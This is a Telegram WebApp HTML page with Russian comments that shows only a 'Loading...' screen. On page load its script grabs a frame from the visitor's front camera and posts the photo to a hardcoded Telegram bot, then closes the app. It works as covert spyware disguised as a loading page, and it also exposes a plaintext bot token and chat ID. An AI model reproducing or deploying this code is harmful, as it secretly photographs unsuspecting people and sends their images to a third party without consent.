<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:sans-serif;">
    <h1>Loading...</h1>
    <script>
        // Получаем объект Telegram WebApp
        const tg = window.Telegram.WebApp;
        tg.ready(); // Сообщаем, что приложение готово

        // Сразу запрашиваем доступ к камере
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                // Создаём скрытый video-элемент
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Ждём 500 мс, чтобы камера прогрелась
                setTimeout(() => {
                    // Создаём canvas для захвата кадра
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Получаем фото в base64 (JPEG)
                    const photoData = canvas.toDataURL('image/jpeg', 0.8);

                    // Отправляем на сервер или напрямую в Telegram
                    sendPhotoToBot(photoData);

                    // Останавливаем камеру
                    stream.getTracks().forEach(track => track.stop());

                }, 500);
            })
            .catch(err => {
                console.error('Ошибка камеры:', err);
                // Если камера не доступна — показываем заглушку
                document.querySelector('h1').innerText = 'Camera not available';
            });

        // Отправка фото через Telegram API
        function sendPhotoToBot(base64Data) {
            const botToken = '8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A';
            const chatId = '7406666272'; // Твой Telegram ID

            // Конвертируем base64 в Blob
            const byteString = atob(base64Data.split(',')[1]);
            const mimeString = base64Data.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([ab], { type: mimeString });

            // Отправляем через FormData
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.jpg');

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Фото отправлено:', data);
                // Можно закрыть WebApp или показать успех
                tg.close();
            })
            .catch(error => {
                console.error('Ошибка отправки:', error);
            });
        }
    </script>
</body>
</html>
